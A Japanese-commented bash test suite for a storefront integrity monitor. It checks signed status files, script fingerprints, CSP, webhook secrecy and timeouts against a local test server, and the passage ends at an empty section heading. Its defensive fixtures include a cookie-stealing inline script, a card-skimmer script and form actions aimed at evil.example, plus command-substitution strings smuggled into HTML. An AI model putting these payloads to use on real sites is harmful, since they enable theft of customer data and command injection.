#!/usr/bin/env bash
# 外の見張り ec-sugar-sentinel（ADR 0105 の 3）を、ここで作るテスト用の鍵と、python3 の小さな HTTP のサーバー（127.0.0.1 だけで受ける）で確かめる。
# 様子（integrity.json と署名）と店頭のページをサーバーから出し、知らせは偽の NOTIFY_COMMAND（本文をファイルに足すだけ）で受けて中身を見る。
# テストの時だけ、設定の ALLOW_HTTP=yes で http を許す。root も Docker も本物のサーバーも使わず、何も変えない（作るのは一時のディレクトリだけ）。
#
#   docker/check-sentinel.sh [見張りの道筋]   既定は deploy/sentinel/ec-sugar-sentinel
#   SENTINEL_BASH=/bin/bash で流す bash を決める（macOS の bash 3.2 で確かめる時）
#
# 確かめること:
#   1. 様子: ok・署名の改竄・鍵の違い・format が 1 でない・古い checked_at と先の checked_at（2 回続いたら）・ok:false（problems を知らせに並べる）・
#      server の変化・世代が上がった時の 1 回だけのお知らせ・取れないのが 1 回では知らせず 2 回で知らせる・戻りの知らせ・busy の 30 分・
#      大きすぎる答え（長さを名乗るものと名乗らずに流すもの）と転送を断る
#   2. 店頭の指紋: 基準が無い時に知らせる・accept で取る・スクリプトの追加・中身の変化・宛先の変化・CSP の変化・form の action の変化・
#      iframe の追加・インラインのスクリプトの追加で知らせる。文・CSRF のトークン・JSON-LD の値・CSP の nonce の変化では知らせない。accept で取り直せる
#   3. 知らせ: 同じ困りごとは 1 回だけ・Webhook の URL が記録・状態・知らせに出ない・Webhook のファイルが 0600 でなければ断る・送れなければ次の回に送り直す
#   4. 設定と道具: http は ALLOW_HTTP の時だけ・LibreSSL を断る・HTML の中身をシェルに渡さない
set -uo pipefail
# 管の先で「あるか」を見る grep -q の代わり。grep -q は見つけた時点で読むのをやめるので、前のコマンドが書き込みの途中だと管が切れ、
# pipefail の下では偽の失敗になる（タイミングしだいで、たまにだけ落ちる）。先に全部を受け取ってから探す
q() {
    local in
    in="$(cat)"
    if [ -z "$in" ]; then grep -q "$@" < /dev/null; else grep -q "$@" <<< "$in"; fi
}

cd "$(dirname "$0")/.."
sentinel="$(cd "$(dirname "${1:-deploy/sentinel/ec-sugar-sentinel}")" && pwd)/$(basename "${1:-deploy/sentinel/ec-sugar-sentinel}")"
bash_bin="${SENTINEL_BASH:-bash}"
fails=0
ng() { echo "NG: $*"; fails=$((fails + 1)); }
ok() { echo "ok: $*"; }

work="$(mktemp -d)"
server_pid=""
cleanup() {
    if [ -n "$server_pid" ]; then kill "$server_pid" 2> /dev/null; wait "$server_pid" 2> /dev/null; fi
    rm -rf "$work"
}
trap cleanup EXIT

# テストで署名に使う openssl 3（見張りと同じ探し方）
ossl=""
for c in "${OPENSSL:-}" "$(command -v openssl 2> /dev/null)" /opt/homebrew/opt/openssl@3/bin/openssl /usr/local/opt/openssl@3/bin/openssl; do
    [ -n "$c" ] && [ -x "$c" ] || continue
    case "$("$c" version 2> /dev/null)" in "OpenSSL "[3-9].*) ossl="$c"; break ;; esac
done
[ -n "$ossl" ] || { echo "NG: OpenSSL 3 以上がありません"; exit 1; }
command -v python3 > /dev/null || { echo "NG: python3 がありません"; exit 1; }
export OPENSSL="$ossl"
real_curl="$(command -v curl)"
mkdir -p "$work/bin"
printf '#!/bin/sh\nprintf "%%s\\n" "$*" >> "%s"\nexec "%s" "$@"\n' "$work/curl-argv" "$real_curl" > "$work/bin/curl"
chmod +x "$work/bin/curl"
export PATH="$work/bin:$PATH"

# ---------- 鍵 ----------
"$ossl" genpkey -algorithm ed25519 -out "$work/key.pem" 2> /dev/null
"$ossl" pkey -in "$work/key.pem" -pubout -out "$work/key.pub" 2> /dev/null
"$ossl" genpkey -algorithm ed25519 -out "$work/other.pem" 2> /dev/null

# ---------- サーバー ----------
www="$work/www"
mkdir -p "$www/.well-known/ec-sugar" "$www/build/assets" "$work/hooks"
cat > "$work/server.py" << 'PY'
import os, secrets, sys, threading, time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
root, port_file, hooks = sys.argv[1], sys.argv[2], sys.argv[3]
ROUTES = {"/": "index.html", "/product": "product.html"}
count = [0]
lock = threading.Lock()
class H(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass
    def do_GET(self):
        path = self.path.split("?", 1)[0]
        # 受けた要求の道筋・合い言葉の見出し・User-Agent を残す（見張りが何を付けたかを確かめる）
        with lock, open(os.path.join(hooks, "..", "requests"), "a") as f:
            f.write("{}\t{}\t{}\n".format(path, self.headers.get("X-EC-Sugar-Sentinel", "-"), self.headers.get("User-Agent", "-")))
        if path == "/slow":
            # 遅い答え（1 回の確かめの時間の上限を確かめる）
            time.sleep(20)
            path = "/"
        if path == "/stream-big":
            # 長さを名乗らずに流し続ける答え（見張りが上限で読むのをやめるか）
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            try:
                for _ in range(400):
                    self.wfile.write(b"<p>" + b"x" * 1020 + b"</p>")
            except (BrokenPipeError, ConnectionResetError):
                pass
            return
        if path == "/redirect":
            self.send_response(302)
            self.send_header("Location", "/")
            self.send_header("Content-Length", "0")
            self.end_headers()
            return
        name = ROUTES.get(path, path.lstrip("/"))
        full = os.path.realpath(os.path.join(root, name))
        if not full.startswith(os.path.realpath(root) + os.sep) or not os.path.isfile(full):
            self.send_response(404)
            self.send_header("Content-Length", "0")
            self.end_headers()
            return
        body = open(full, "rb").read()
        self.send_response(200)
        self.send_header("Content-Length", str(len(body)))
        # 見出しの足し（<ファイル>.headers の 1 行 1 つ）。Content-Type はそこに無ければ html を UTF-8 で
        extra = []
        if os.path.isfile(full + ".headers"):
            extra = [l.split(":", 1) for l in open(full + ".headers").read().splitlines() if ":" in l]
        if full.endswith(".html") and not any(k.strip().lower() == "content-type" for k, _ in extra):
            self.send_header("Content-Type", "text/html; charset=UTF-8")
        for k, v in extra:
            self.send_header(k.strip(), v.strip())
        csp = full + ".csp"
        if os.path.isfile(csp):
            # 要求ごとに変わる nonce（見張りがそろえるか）
            self.send_header("Content-Security-Policy", open(csp).read().strip().replace("NONCE", secrets.token_hex(8)))
        self.end_headers()
        self.wfile.write(body)
    def do_POST(self):
        length = int(self.headers.get("Content-Length", "0"))
        data = self.rfile.read(length)
        count[0] += 1
        with open(os.path.join(hooks, "post-{}".format(count[0])), "wb") as f:
            f.write(self.path.encode() + b"\n" + data)
        self.send_response(200 if "/good-" in self.path else 404)
        self.send_header("Content-Length", "0")
        self.end_headers()
srv = ThreadingHTTPServer(("127.0.0.1", 0), H)
with open(port_file + ".tmp", "w") as f:
    f.write(str(srv.server_address[1]))
os.rename(port_file + ".tmp", port_file)
srv.serve_forever()
PY
python3 -I "$work/server.py" "$www" "$work/port" "$work/hooks" &
server_pid=$!
for _ in $(seq 1 50); do [ -s "$work/port" ] && break; sleep 0.1; done
[ -s "$work/port" ] || { echo "NG: テスト用のサーバーが立ちません"; exit 1; }
port="$(cat "$work/port")"
base="http://127.0.0.1:$port"

# ---------- 様子と店頭を作る部品 ----------
NOW="$(date +%s)"
status_file="$www/.well-known/ec-sugar/integrity.json"
# put_status <server> <世代> <ok> <problems をカンマで> <busy> <checked_at の今からの秒> [署名の鍵]
put_status() {
    python3 -I -c 'import json, sys, time
server, gen, ok, problems, busy, offset, now = sys.argv[1:]
d = {"format": 1, "server": server, "generation": int(gen),
     "checked_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(int(now) + int(offset))),
     "ok": ok == "true", "problems": [p for p in problems.split(",") if p]}
if busy == "true":
    d["busy"] = True
sys.stdout.write(json.dumps(d, separators=(",", ":")))' "$1" "$2" "$3" "$4" "$5" "$6" "$NOW" > "$status_file"
    sign_status "${7:-$work/key.pem}"
}
sign_status() {
    "$ossl" pkeyutl -sign -inkey "$1" -rawin -in "$status_file" -out "$work/sig.bin" 2> /dev/null
    "$ossl" base64 -A -in "$work/sig.bin" > "$status_file.sig"
    echo >> "$status_file.sig"
}
good_status() { put_status srv-a "${1:-1}" true "" false 0; }

CSP_DEFAULT="default-src 'none'; script-src 'self'; style-src 'self' 'nonce-NONCE'; form-action 'self' https://checkout.stripe.com; frame-ancestors 'none'"
reset_pages() {
    TOKEN="tok-$RANDOM$RANDOM"
    TEXT="季節の羊羹を作りました"
    PRICE=1200
    APP_SRC="/build/assets/app-3f2a.js"
    FORM_ACTION="/cart/items"
    HEAD_EXTRA=""
    BODY_EXTRA=""
    PRODUCT_EXTRA=""
    rm -f "$www/index.html.headers"
    printf '%s' "console.log('app');" > "$www/build/assets/app-3f2a.js"
    printf '%s' "export const v = 1;" > "$www/build/assets/vendor-91c0.js"
    printf '%s' "$CSP_DEFAULT" > "$www/index.html.csp"
    printf '%s' "$CSP_DEFAULT" > "$www/product.html.csp"
    write_pages
}
write_pages() {
    cat > "$www/index.html" << HTML
<!DOCTYPE html>
<html lang="ja"><head><meta charset="utf-8">
<meta name="csrf-token" content="$TOKEN">
<title>お菓子の店</title>
<script type="application/ld+json">{"@type":"Product","name":"$TEXT","offers":{"price":$PRICE}}</script>
<link rel="stylesheet" href="/build/assets/theme-77aa.css">
<link rel="modulepreload" href="/build/assets/vendor-91c0.js">
<script type="module" src="$APP_SRC"></script>
$HEAD_EXTRA
</head><body>
<p>$TEXT</p>
<img src="/media/$RANDOM.jpg" alt="$TEXT">
<a href="/products/01HZY3K4W5X6Y7Z8A9B0C1D2E3">羊羹 ¥$PRICE</a>
<form method="post" action="$FORM_ACTION"><input type="hidden" name="_token" value="$TOKEN"><button>カートに入れる</button></form>
<form action="/products" method="get"><input name="q"></form>
$BODY_EXTRA
</body></html>
HTML
    cat > "$www/product.html" << HTML
<!DOCTYPE html>
<html lang="ja"><head><meta charset="utf-8"><meta name="csrf-token" content="$TOKEN">
<script type="module" src="$APP_SRC"></script></head><body>
<h1>$TEXT</h1>
<a href="/products/$RANDOM">ほかの商品</a> <a href="https://www.instagram.com/example_shop/">Instagram</a>
<form method="post" action="$base/p/booking/01HZY3K4W5X6Y7Z8A9B0C1D2E3"><input type="hidden" name="_token" value="$TOKEN"></form>
$PRODUCT_EXTRA
</body></html>
HTML
}

notified="$work/notified"
conf="$work/sentinel.conf"
cat > "$conf" << CONF
# テスト用（http はテストだけ）
STATUS_URL=$base/.well-known/ec-sugar/integrity.json
PUBLIC_KEY=$work/key.pub
PAGE=$base/
LINKS_PAGE=$base/product
NOTIFY_COMMAND=cat >> "$notified"; echo '----' >> "$notified"
STATE_DIR=$work/state
NAME=テストの店
ALLOW_HTTP=yes
CONF

rc=0
run() {
    : > "$notified"
    EC_SENTINEL_NOW="$NOW" "$bash_bin" "$sentinel" "$@" > "$work/out" 2>&1
    rc=$?
}
check() { run check "$conf"; }
quiet() {
    if [ -s "$notified" ]; then ng "$1（知らせが出た: $(head -c 300 "$notified" | tr '\n' ' ')）"; else ok "$1"; fi
}
told() {
    local pattern="$1" what="$2"
    if grep -qF -- "$pattern" "$notified"; then ok "$what"; else ng "${what}（知らせに「${pattern}」が無い: $(head -c 400 "$notified" | tr '\n' ' ')${3:+ / 出力: $(tail -c 300 "$work/out" | tr '\n' ' ')}）"; fi
}
code_is() { if [ "$rc" = "$1" ]; then ok "$2"; else ng "$2（終わりの値 ${rc}、期待 $1: $(tail -c 300 "$work/out" | tr '\n' ' ')）"; fi; }

# ---------- 1. 基準が無い時と accept ----------
good_status 1
reset_pages
check
told "ショップの基準がありません" "基準が無い時に知らせる"
told "$base/product" "基準の無いページを並べる"
code_is 1 "基準が無い時は困りごとありで終わる"
check
quiet "基準が無いのは続いている間 1 回だけ"
run accept "$conf"
code_is 0 "accept で基準を取る"
grep -qF "スクリプト /build/assets/app-3f2a.js sha256=" "$work/out" && ok "accept が取った指紋を見せる" || ng "accept が指紋を見せない: $(head -c 300 "$work/out")"
check
quiet "基準を取った後は何も知らせない"
code_is 0 "困りごとが無ければ 0 で終わる"
[ "$(stat -c %a "$work/state" 2> /dev/null || stat -f %Lp "$work/state")" = 700 ] && ok "状態の保存先は 0700" || ng "状態の保存先が 0700 でない"

# ---------- 2. 店の人が直すものと、毎回変わるものでは知らせない ----------
TOKEN="tok-other-$RANDOM"
TEXT="冬の新しい羊羹（文を直した）"
PRICE=1500
write_pages
check
quiet "文・写真・リンク・CSRF のトークン・JSON-LD の値・CSP の nonce が変わっても知らせない"
code_is 0 "変わったのが中身だけなら 0 で終わる"

# ---------- 3. 店頭の書き換えで知らせる ----------
HEAD_EXTRA='<script src="https://evil.example/skim.js"></script>'
write_pages
check
told "足された: スクリプト https://evil.example/skim.js" "外のスクリプトの追加で知らせる"
told "ショップの指紋が基準と違います" "店頭の違いの題"
check
quiet "同じ書き換えは続いている間 1 回だけ"
HEAD_EXTRA=""
write_pages
check
told "ショップの指紋が基準と同じに戻りました: $base/" "戻ったら戻りましたを知らせる"
check
quiet "戻りは 1 回だけ"

printf '%s' "console.log('app'); document.querySelector('form').action='https://evil.example/'" > "$www/build/assets/app-3f2a.js"
check
told "変わった: スクリプト /build/assets/app-3f2a.js の中身" "同じ出どころのスクリプトの中身の変化で知らせる"
told "$base/product" "同じスクリプトを使うほかのページも知らせる"
printf '%s' "console.log('app');" > "$www/build/assets/app-3f2a.js"
check
told "戻りました" "スクリプトの中身が戻ったら知らせる"

printf '%s' "export const v = 2;" > "$www/build/assets/vendor-91c0.js"
check
told "変わった: スクリプト /build/assets/vendor-91c0.js（modulepreload） の中身" "modulepreload のスクリプトの中身の変化で知らせる"
printf '%s' "export const v = 1;" > "$www/build/assets/vendor-91c0.js"
check

cp "$www/build/assets/app-3f2a.js" "$www/build/assets/app-other.js"
APP_SRC="/build/assets/app-other.js"
write_pages
check
told "足された: スクリプト /build/assets/app-other.js" "スクリプトの宛先の変化で知らせる（足された）"
told "消えた: スクリプト /build/assets/app-3f2a.js" "スクリプトの宛先の変化で知らせる（消えた）"
APP_SRC="/build/assets/app-3f2a.js"
write_pages
check

printf '%s' "default-src 'none'; script-src 'self' https://evil.example; style-src 'self' 'nonce-NONCE'; form-action 'self' https://checkout.stripe.com; frame-ancestors 'none'" > "$www/index.html.csp"
check
told "script-src に足された: https://evil.example" "CSP の変化で知らせる"
printf '%s' "$CSP_DEFAULT" > "$www/index.html.csp"
check

FORM_ACTION="https://evil.example/collect"
write_pages
check
told "https://evil.example/collect" "form の action の変化で知らせる"
told "変わった: フォームの送信先 post /cart/items" "form の action は変わったとして並べる"
FORM_ACTION="/cart/items"
write_pages
check

BODY_EXTRA='<iframe src="https://evil.example/pay"></iframe>'
write_pages
check
told "足された: 埋め込み（iframe） https://evil.example" "iframe の追加で知らせる"
BODY_EXTRA='<script>fetch("https://evil.example/?c="+document.cookie)</script>'
write_pages
check
told "足された: インラインのスクリプト （type なし） sha256=" "インラインのスクリプトの追加で知らせる"
told "【要対応・中身が変わった】ショップの指紋が基準と違います" "違いが変わったらもう一度知らせる"
BODY_EXTRA='<meta http-equiv="refresh" content="0;url=https://evil.example/">'
write_pages
check
told "足された: meta http-equiv refresh 0;url=https://evil.example/" "meta refresh の追加で知らせる"
BODY_EXTRA=""
write_pages
check
told "戻りました" "書き換えを戻したら知らせる"

# 中身をシェルに渡さない（HTML の値にコマンドを書いても動かない）
BODY_EXTRA='<script src="/x$(touch '"$work"'/pwned)`touch '"$work"'/pwned2`.js"></script>'
write_pages
check
[ ! -e "$work/pwned" ] && [ ! -e "$work/pwned2" ] && ok "HTML の値のコマンドは動かない" || ng "HTML の値のコマンドが動いた"
BODY_EXTRA=""
write_pages
check

# accept で取り直せる（更新の後の形）
cp "$www/build/assets/app-3f2a.js" "$www/build/assets/app-9d9d.js"
APP_SRC="/build/assets/app-9d9d.js"
write_pages
check
told "足された: スクリプト /build/assets/app-9d9d.js" "更新でスクリプトが替わると知らせる"
run accept "$conf"
code_is 0 "更新の後に accept で取り直す"
grep -qF "足された: スクリプト /build/assets/app-9d9d.js" "$work/out" && ok "accept が前の基準との違いを見せる" || ng "accept が違いを見せない"
check
quiet "取り直した後は知らせない（戻りましたも出さない）"
code_is 0 "取り直した後は 0 で終わる"

# ---------- 4. 様子 ----------
put_status srv-a 1 false "image:app,file:compose" false 0
check
told "サーバーの内部の整合性チェックが問題を出しています" "ok:false で知らせる"
told "file:compose, image:app" "problems を知らせに並べる"
check
quiet "同じ problems は 1 回だけ"
put_status srv-a 1 false "image:app,file:compose,container:extra" false 0
check
told "container:extra" "problems が増えたらもう一度知らせる"
told "【要対応・中身が変わった】" "problems が増えたら中身が変わったとして知らせる"
good_status 1
check
told "サーバーの内部の整合性チェックの問題が無くなりました" "ok に戻ったら知らせる"

put_status srv-b 1 true "" false 0
check
told "状態の server が基準と違います" "server の変化で知らせる"
check
quiet "server の違いは 1 回だけ"
good_status 1
check
told "状態の server が基準と同じに戻りました" "server が戻ったら知らせる"

good_status 2
check
told "基準の状態が変わりました（世代 1 → 2" "世代が上がったら知らせる"
check
quiet "世代のお知らせは 1 回だけ"

good_status 2
printf '%s' '{"format":1,"server":"srv-a","generation":2,"checked_at":"'"$(python3 -I -c 'import time,sys; print(time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(int(sys.argv[1]))))' "$NOW")"'","ok":true,"problems":[] }' > "$status_file"
check
told "状態の署名が公開鍵で通りません" "署名の後に書き換えた様子で知らせる"
check
quiet "署名の困りごとは 1 回だけ"
good_status 2
check
told "状態の署名が通るようになりました" "署名が戻ったら知らせる"

put_status srv-a 2 true "" false 0 "$work/other.pem"
check
told "状態の署名が公開鍵で通りません" "別の鍵の署名で知らせる"
good_status 2
check

python3 -I -c 'import json,sys; d=json.load(open(sys.argv[1])); d["format"]=2; open(sys.argv[1],"w").write(json.dumps(d,separators=(",",":")))' "$status_file"
sign_status "$work/key.pem"
check
told "状態の形が違います" "format が 1 でなければ知らせる"
good_status 2
check

put_status srv-a 2 true "" false -600
check
quiet "古い checked_at は 1 回では知らせない"
check
told "状態が古いままです" "古い checked_at が 2 回続いたら知らせる"
good_status 2
check
told "状態の時刻が新しくなりました" "新しくなったら知らせる"

put_status srv-a 2 true "" false 600
check
quiet "先の checked_at は 1 回では知らせない"
check
told "状態の時刻が先に進みすぎています" "先の checked_at が 2 回続いたら知らせる"
good_status 2
check

mv "$status_file" "$work/status.bak"
check
quiet "取れないのが 1 回では知らせない"
check
told "状態（integrity.json）を 2 回続けて取れません" "取れないのが 2 回続いたら知らせる"
told "HTTP 404" "取れない理由を添える"
mv "$work/status.bak" "$status_file"
good_status 2
check
told "状態を取れるようになりました" "取れるようになったら知らせる"

# busy: 30 分までは知らせず、30 分を超えたら 1 回。終われば戻り
put_status srv-a 2 true "" true 0
check
quiet "busy になってすぐは知らせない"
NOW=$((NOW + 29 * 60))
put_status srv-a 2 true "" true 0
check
quiet "busy が 29 分では知らせない"
NOW=$((NOW + 2 * 60))
put_status srv-a 2 true "" true 0
check
told "更新などの途中（busy）が 30 分を超えています" "busy が 30 分を超えたら知らせる"
check
quiet "busy は 1 回だけ"
good_status 2
check
told "更新などの途中（busy）が終わりました" "busy が終わったら知らせる"

# 大きすぎる答え（長さを名乗るもの・名乗らずに流すもの）と転送を断る
python3 -I -c 'import sys; open(sys.argv[1],"w").write("{\"pad\":\"" + "x"*70000 + "\"}")' "$www/big.json"
sed "s#^STATUS_URL=.*#STATUS_URL=$base/big.json#" "$conf" > "$work/big.conf"
EC_SENTINEL_NOW="$NOW" "$bash_bin" "$sentinel" check "$work/big.conf" > "$work/out" 2>&1
grep -qF "応答が大きすぎます" "$work/out" && ok "長さを名乗る大きすぎる様子を断る" || ng "大きすぎる様子を断らない: $(head -c 300 "$work/out")"
# 長さを名乗らずに流す答え（様子の上限 64 KB を超えて流し続ける）
sed "s#^STATUS_URL=.*#STATUS_URL=$base/stream-big#" "$conf" > "$work/stream.conf"
EC_SENTINEL_NOW="$NOW" "$bash_bin" "$sentinel" check "$work/stream.conf" > "$work/out" 2>&1
grep -qF "応答が大きすぎます" "$work/out" && ok "長さを名乗らずに流す大きすぎる答えを断る" || ng "流し続ける答えを断らない: $(head -c 300 "$work/out")"
sed "s#^STATUS_URL=.*#STATUS_URL=$base/redirect#" "$conf" > "$work/redirect.conf"
EC_SENTINEL_NOW="$NOW" "$bash_bin" "$sentinel" check "$work/redirect.conf" > "$work/out" 2>&1
grep -qF "状態を取れません: HTTP 302" "$work/out" && ok "転送を追わない" || ng "転送を追った: $(head -c 300 "$work/out")"

# 送れない時は、次の回に送り直す（知らせた印を付けない）
sed "s#^NOTIFY_COMMAND=.*#NOTIFY_COMMAND=cat >> \"$notified\"; exit 1#" "$conf" > "$work/failnotify.conf"
put_status srv-a 2 false "image:web" false 0
: > "$notified"
EC_SENTINEL_NOW="$NOW" "$bash_bin" "$sentinel" check "$work/failnotify.conf" > "$work/out" 2>&1
rc=$?
grep -qF "NOTIFY_COMMAND が失敗しました" "$work/out" && [ "$rc" = 1 ] && ok "送れなければ知らせて 1 で終わる" || ng "送れない時の扱い（${rc}）"
check
told "image:web" "送れなかった困りごとを次の回に送り直す"
good_status 2
check

# ---------- 5. Webhook ----------
secret="SeCrEtToKeN$RANDOM$RANDOM"
printf '%s\n' "$base/hook/good-$secret" > "$work/webhook"
chmod 600 "$work/webhook"
grep -v "^NOTIFY_COMMAND" "$conf" | sed "s#^STATE_DIR=.*#STATE_DIR=$work/state-hook#" > "$work/hook.conf"
echo "WEBHOOK_FILE=$work/webhook" >> "$work/hook.conf"
EC_SENTINEL_NOW="$NOW" "$bash_bin" "$sentinel" test-notify "$work/hook.conf" > "$work/out" 2>&1
rc=$?
post="$(ls "$work/hooks" | head -1)"
if [ "$rc" = 0 ] && [ -n "$post" ] && python3 -I -c 'import json,sys; d=open(sys.argv[1],"rb").read().split(b"\n",1)[1]; t=json.loads(d)["text"]; sys.exit(0 if "テスト通知" in t and "テストの店" in t else 1)' "$work/hooks/$post"; then
    ok "Webhook へ Slack の形（text）で送る"
    python3 -I -c 'import json,sys; d=json.loads(open(sys.argv[1],"rb").read().split(b"\n",1)[1]); sys.exit(0 if d.get("unfurl_links") is False and d.get("unfurl_media") is False else 1)' "$work/hooks/$post" && ok "Slack にリンクを展開させない" || ng "unfurl_links・unfurl_media が無い"
else
    ng "Webhook へ送れない（$rc: $(head -c 300 "$work/out")）"
fi
put_status srv-a 2 false "image:<b>&app" false 0
EC_SENTINEL_NOW="$NOW" "$bash_bin" "$sentinel" check "$work/hook.conf" > "$work/out" 2>&1
grep -rqF "image:bapp" "$work/hooks" && ok "Webhook の知らせに困りごとの名前（記号は除く）" || ng "Webhook の知らせに困りごとが無い"
printf '%s\n' "$base/hook/bad-$secret" > "$work/webhook"
put_status srv-a 2 false "image:worker" false 0
EC_SENTINEL_NOW="$NOW" "$bash_bin" "$sentinel" check "$work/hook.conf" >> "$work/out" 2>&1
grep -qF "Webhook へ送れませんでした（HTTP 404）" "$work/out" && ok "Webhook の失敗を URL なしで出す" || ng "Webhook の失敗が出ない: $(tail -c 300 "$work/out")"
EC_SENTINEL_NOW="$NOW" "$bash_bin" "$sentinel" accept "$work/hook.conf" >> "$work/out" 2>&1
if grep -rqF "$secret" "$work/out" "$work/state-hook"; then ng "Webhook の URL が記録か状態に出た"; else ok "Webhook の URL を記録と状態に出さない"; fi
if grep -qF "$secret" "$work/curl-argv"; then ng "Webhook の URL が curl の引数に出た"; else ok "Webhook の URL を curl の引数に出さない"; fi
leak=0
for f in "$work/hooks"/post-*; do tail -n +2 "$f" | q -F "$secret" && leak=1; done
[ "$leak" = 0 ] && ok "Webhook の URL を知らせの本文に出さない" || ng "Webhook の URL が知らせの本文に出た"
printf '%s\n' "$base/hook/good-$secret" > "$work/webhook"
chmod 644 "$work/webhook"
EC_SENTINEL_NOW="$NOW" "$bash_bin" "$sentinel" test-notify "$work/hook.conf" > "$work/out" 2>&1
rc=$?
[ "$rc" = 2 ] && grep -qF "0600" "$work/out" && ok "ほかの人が読める Webhook のファイルを断る" || ng "0644 の Webhook のファイルを断らない（${rc}）"
grep -qF "$secret" "$work/out" && ng "断った時に Webhook の URL を出した" || ok "断った時も Webhook の URL を出さない"
chmod 600 "$work/webhook"
good_status 2

# ---------- 7. 注釈・CDATA に隠した要素（HTMLParser とブラウザの解き方の違い） ----------
hide() {
    BODY_EXTRA="$1"
    write_pages
    check
    told "$2" "$3"
    BODY_EXTRA=""
    write_pages
    check
}
hide '<!--><script src="https://evil.example/c1.js"></script>-->' "隠れた: スクリプト https://evil.example/c1.js" "<!--> の後ろに隠したスクリプトを隠れた要素として知らせる"
told "ショップの隠れた要素が無くなりました" "隠れた要素が無くなったら戻りを知らせる"
hide '<!--><meta http-equiv="refresh" content="0;url=https://evil.example/pay">-->' "隠れた: meta http-equiv refresh 0;url=https://evil.example/pay" "<!--> の後ろに隠した meta refresh を知らせる"
hide '<!---><script src="https://evil.example/c2.js"></script>-->' "https://evil.example/c2.js" "<!---> の後ろに隠したスクリプトを知らせる"
hide '<![CDATA[><script src="https://evil.example/c3.js"></script>]]>' "https://evil.example/c3.js" "CDATA に隠したスクリプトを知らせる"
hide '<!-- x --!><script src="https://evil.example/c4.js"></script> -->' "https://evil.example/c4.js" "--!> の後ろに隠したスクリプトを知らせる"
hide '<!-- <iframe src="https://evil.example/f"></iframe> -->' "https://evil.example" "注釈の中の iframe も拾う"

# 答えの見出しの Refresh・Link・Content-Type
printf 'Refresh: 0;url=https://evil.example/pay\n' > "$www/index.html.headers"
check
told "足された: 応答のヘッダー refresh 0;url=https://evil.example/pay" "Refresh の見出しで知らせる"
printf 'Link: <https://evil.example/x.js>; rel=preload; as=script\n' > "$www/index.html.headers"
check
told "応答のヘッダー link" "Link の見出しで知らせる"
printf 'Content-Type: text/html; charset=Shift_JIS\n' > "$www/index.html.headers"
check
told "ショップのページが UTF-8 ではありません" "UTF-8 でない Content-Type で知らせる"
told "shift_jis" "名乗った文字コードを添える"
rm -f "$www/index.html.headers"
check
told "ショップのページが UTF-8 に戻りました" "UTF-8 に戻ったら知らせる"
BODY_EXTRA='<meta charset="windows-1252">'
write_pages
check
told "記載された文字コードが windows-1252" "meta charset が UTF-8 でなければ知らせる"
BODY_EXTRA=""
write_pages
check

# 外へのリンクの出どころ（LINKS_PAGE だけ）
PRODUCT_EXTRA='<a href="https://evil.example/checkout">お支払いはこちら</a>'
BODY_EXTRA='<a href="https://other.example/blog">ブログ</a>'
write_pages
check
told "足された: 外へのリンク先（オリジン） https://evil.example" "LINKS_PAGE の外へのリンクの出どころが増えたら知らせる"
grep -qF "other.example" "$notified" && ng "PAGE の外へのリンクで知らせた" || ok "PAGE（LINKS_PAGE でない）の外へのリンクでは知らせない"
PRODUCT_EXTRA=""
BODY_EXTRA=""
write_pages
check

# User-Agent: 既定はふつうのブラウザの形、設定で替えられる
grep -q $'\t-\tMozilla/5.0 (Windows NT' "$work/requests" && ok "既定の User-Agent はブラウザの形" || ng "既定の User-Agent がブラウザの形でない"
grep -qF "ec-sugar-sentinel" "$work/requests" && ng "User-Agent に見張りの名前が出た" || ok "User-Agent に見張りの名前を出さない"
{ cat "$conf"; echo "USER_AGENT=TestAgent/9"; } > "$work/ua.conf"
: > "$work/requests"
EC_SENTINEL_NOW="$NOW" "$bash_bin" "$sentinel" check "$work/ua.conf" > "$work/out" 2>&1
grep -q $'\tTestAgent/9$' "$work/requests" && ok "USER_AGENT で替えられる" || ng "USER_AGENT が効かない"

# ---------- 8. 時間の上限（様子はページより先に知らせる） ----------
sed -e "s#^PAGE=.*#PAGE=$base/slow#" -e "/^LINKS_PAGE=/d" -e "s#^STATE_DIR=.*#STATE_DIR=$work/state-slow#" "$conf" > "$work/slow.conf"
echo "TIME_LIMIT=2" >> "$work/slow.conf"
put_status srv-a 2 false "image,file" false 0
: > "$notified"
started="$(date +%s)"
EC_SENTINEL_NOW="$NOW" "$bash_bin" "$sentinel" check "$work/slow.conf" > "$work/out" 2>&1
rc=$?
took=$(( $(date +%s) - started ))
[ "$took" -lt 10 ] && ok "遅い答えでも時間の上限で終わる（約 ${took} 秒）" || ng "時間の上限で終わらない（${took} 秒）"
told "1 回の確認が時間の上限を越えました" "時間の上限を越えたら知らせる"
code_is 1 "時間の上限を越えたら 1 で終わる"
first="$(sed -n '1,/^----$/p' "$notified")"
case "$first" in *"サーバーの内部の整合性チェックが問題を出しています"*) ok "様子の知らせはページを見る前に送る" ;; *) ng "様子の知らせがページの後になった: $(printf '%s' "$first" | head -c 200)" ;; esac
case "$first" in *"時間の上限"*) ng "様子の知らせとページの知らせが 1 通になった" ;; *) ok "様子とページの知らせは別に送る" ;; esac
good_status 2
grep -qF "sudo ec-sugar status" "$notified" && ok "problems の細かい名前はサーバーで見ると案内する" || ng "problems の案内が無い"

# ---------- 9. 前の回が終わらない（錠が残った） ----------
python3 -I -c 'import fcntl, os, sys, time
fd = os.open(sys.argv[1], os.O_RDWR | os.O_CREAT, 0o600)
fcntl.flock(fd, fcntl.LOCK_EX)
open(sys.argv[2], "w").close()
time.sleep(300)' "$work/state/lock" "$work/locked" &
holder=$!
for _ in $(seq 1 50); do [ -e "$work/locked" ] && break; sleep 0.1; done
check
quiet "錠が取れないのが 1 回目では知らせない"
code_is 0 "錠が取れない 1 回目は 0 で終わる"
SAVED_NOW="$NOW"
NOW=$((NOW + 16 * 60))
check
told "前の回の確認が約 16 分終わりません" "錠が 15 分取れなければ知らせる"
code_is 1 "錠が 15 分取れなければ 1 で終わる"
check
quiet "前の回が終わらないのは 1 回だけ"
code_is 1 "続いている間は 1 で終わる"
kill "$holder" 2> /dev/null
wait "$holder" 2> /dev/null
NOW="$SAVED_NOW"
good_status 2
check
told "前の回の確認が終わりました" "錠が取れたら戻りを知らせる"
[ ! -e "$work/state/lock-blocked-since" ] && [ ! -e "$work/state/lock-blocked-notified" ] && ok "錠の印を片付ける" || ng "錠の印が残った"

# ---------- 10. accept の断り ----------
